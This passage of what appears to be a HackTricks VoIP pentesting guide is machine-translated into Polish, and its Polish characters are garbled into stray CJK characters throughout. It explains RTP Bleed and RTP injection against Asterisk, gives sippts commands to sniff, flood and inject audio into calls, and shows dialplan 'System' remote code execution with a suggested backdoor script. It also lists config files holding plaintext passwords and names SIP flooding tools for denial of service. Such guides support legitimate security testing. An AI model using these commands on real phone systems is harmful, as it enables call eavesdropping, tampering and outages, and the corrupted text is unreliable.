**RTCPBleed** to powa偶ny problem bezpieczestwa, kt贸ry dotyczy serwer贸w VoIP opartych na Asterisku (opublikowany w 2017 roku). Wra偶liwo ta pozwala na **przechwytywanie i przekierowywanie ruchu RTP (Real Time Protocol)**, kt贸ry przenosi rozmowy VoIP, przez **ka偶dego w Internecie**. Dzieje si tak, poniewa偶 ruch RTP omija uwierzytelnianie podczas przechodzenia przez zapory NAT (Network Address Translation).

Proxysy RTP pr贸buj rozwiza **ograniczenia NAT** wpywajce na systemy RTC, proxyzujc strumienie RTP midzy dwiema lub wicej stronami. Gdy NAT jest w u偶yciu, oprogramowanie proxy RTP czsto nie mo偶e polega na informacjach o IP i porcie RTP uzyskanych przez sygnalizacj (np. SIP). Dlatego wiele proxy RTP wdro偶yo mechanizm, w kt贸rym taki **tuplet IP i port jest uczony automatycznie**. Czsto odbywa si to poprzez inspekcj przychodzcego ruchu RTP i oznaczanie adresu IP i portu 藕r贸dowego dla wszelkiego przychodzcego ruchu RTP jako tego, na kt贸ry nale偶y odpowiedzie. Ten mechanizm, kt贸ry mo偶e by nazywany "trybem uczenia si", **nie wykorzystuje 偶adnego rodzaju uwierzytelniania**. Dlatego **atakujcy** mog **wysya ruch RTP do proxy RTP** i otrzymywa proxowany ruch RTP przeznaczony dla dzwonicego lub odbierajcego w trwajcym strumieniu RTP. Nazywamy t wra偶liwo RTP Bleed, poniewa偶 pozwala ona atakujcym na odbieranie strumieni medi贸w RTP przeznaczonych dla legalnych u偶ytkownik贸w.

Innym interesujcym zachowaniem proxy RTP i stos贸w RTP jest to, 偶e czasami, **nawet jeli nie s podatne na RTP Bleed**, bd **akceptowa, przekazywa i/lub przetwarza pakiety RTP z dowolnego 藕r贸da**. Dlatego atakujcy mog wysya pakiety RTP, co mo偶e pozwoli im na wstrzyknicie swojego medium zamiast legalnego. Nazywamy ten atak wstrzykniciem RTP, poniewa偶 pozwala on na wstrzyknicie nielegalnych pakiet贸w RTP do istniejcych strumieni RTP. Ta wra偶liwo mo偶e wystpowa zar贸wno w proxy RTP, jak i w punktach kocowych.

Asterisk i FreePBX tradycyjnie u偶yway ustawienia **`NAT=yes`**, kt贸re umo偶liwia ruchowi RTP omijanie uwierzytelniania, co potencjalnie prowadzi do braku d藕wiku lub d藕wiku jednokierunkowego w poczeniach.

Aby uzyska wicej informacji, sprawd藕 [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed wykrywa wra偶liwo RTP Bleed, wysyajc strumienie RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed wykrywa podatno RTP Bleed, wysyajc strumienie RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood wykorzystuje luk RTP Bleed, wysyajc strumienie RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject wykorzystuje luk RTP Bleed, wstrzykujc plik audio (format WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

W Asterisku w jaki spos贸b udaje ci si **doda reguy rozszerze i je przeadowa** (na przykad poprzez skompromitowanie podatnego serwera mened偶era webowego), mo偶liwe jest uzyskanie RCE za pomoc polecenia **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
If the server is **disallowing the use of certain characters** in the **`System`** command (like in Elastix), check if the web server allows to **create files somehow inside the system** (like in Elastix or trixbox), and use it to **create a backdoor script** and then use **`System`** to **execute** that **script**.
{% endhint %}

#### Ciekawe lokalne pliki i uprawnienia

* **`sip.conf`** -> Zawiera haso u偶ytkownik贸w SIP.
* Jeli **serwer Asterisk dziaa jako root**, mo偶esz skompromitowa root.
* **u偶ytkownik root mysql** mo偶e **nie mie hasa**.
* to mo偶e by u偶yte do stworzenia nowego u偶ytkownika mysql jako backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Zawiera haso administratora panelu webowego (FreePBX).
* **`FreePBX.conf`** -> Zawiera haso u偶ytkownika FreePBXuser u偶ywanego do dostpu do bazy danych.
* to mo偶e by u偶yte do stworzenia nowego u偶ytkownika mysql jako backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Zawiera kilka hase w czystym tekcie, takich jak haso root mysql, haso IMAPd, haso administratora webowego.
* **Kilka folder贸w** bdzie nale偶ao do skompromitowanego u偶ytkownika asterisk (jeli nie dziaa jako root). U偶ytkownik ten mo偶e czyta poprzednie pliki i kontrolowa konfiguracj, wic m贸gby sprawi, 偶e Asterisk zaadowaby inne zainfekowane binaria podczas wykonywania.

### Wstrzykiwanie RTP

Mo偶liwe jest wstawienie **`.wav`** do rozm贸w za pomoc narzdzi takich jak **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Lub mo偶esz u偶y skrypt贸w z [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) do **skanowania rozm贸w** (**`rtpscan.pl`**), wysyania `.wav` do rozmowy (**`rtpsend.pl`**) i **wstawiania haasu** do rozmowy (**`rtpflood.pl`**).

### DoS

Istnieje kilka sposob贸w, aby spr贸bowa osign DoS na serwerach VoIP.

* **`SIPPTS flood`** z [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood wysya nieograniczon liczb wiadomoci do celu.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** z [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping wykonuje ping SIP, aby zobaczy czas odpowiedzi serwera.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS protokou IAX u偶ywanego przez Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Narzdzie do przeprowadzania floodingu wiadomoci SIP/SDP INVITE przez UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Wysya kilka dobrze uformowanych pakiet贸w RTP. Nale偶y zna porty RTP, kt贸re s u偶ywane (najpierw sniff).
* [**SIPp**](https://github.com/SIPp/sipp): Umo偶liwia analizowanie i generowanie ruchu SIP, wic mo偶e by r贸wnie偶 u偶ywane do DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Szwajcarski scyzoryk SIP. Mo偶e by r贸wnie偶 u偶ywany do przeprowadzania atak贸w SIP.
* Fuzzery: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Luki w systemie operacyjnym

Najatwiejszym sposobem na zainstalowanie oprogramowania takiego jak Asterisk jest pobranie **dystrybucji systemu operacyjnego**, kt贸ra ma je ju偶 zainstalowane, takich jak: **FreePBX, Elastix, Trixbox**... Problem z nimi polega na tym, 偶e gdy ju偶 dziaaj, administratorzy system贸w mog **nie aktualizowa ich ponownie**, a **luki** bd odkrywane z czasem.

## Referencje

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Get a hacker's perspective on your web apps, network, and cloud**

**Find and report critical, exploitable vulnerabilities with real business impact.** Use our 20+ custom tools to map the attack surface, find security issues that let you escalate privileges, and use automated exploits to collect essential evidence, turning your hard work into persuasive reports.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
